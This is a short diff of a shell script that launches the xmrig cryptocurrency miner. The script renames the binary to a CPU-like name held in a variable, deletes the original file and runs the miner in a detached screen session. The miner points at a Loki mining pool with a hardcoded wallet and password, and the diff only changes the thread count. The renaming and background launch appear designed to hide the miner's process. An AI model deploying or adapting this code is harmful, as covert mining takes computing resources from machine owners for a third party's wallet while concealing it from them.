@@ -13,4 +13,4 @@ mv xmrig $azure -n
 sudo cp $azure "$cpuname"
 sudo rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --donate-level 0 -o loki.pool.mine2gether.com:2221 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p "pass=tienn" -a rx/loki -k -t 48
+screen -d -m ./"${cpuname}" --donate-level 0 -o loki.pool.mine2gether.com:2221 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p "pass=tienn" -a rx/loki -k -t 32
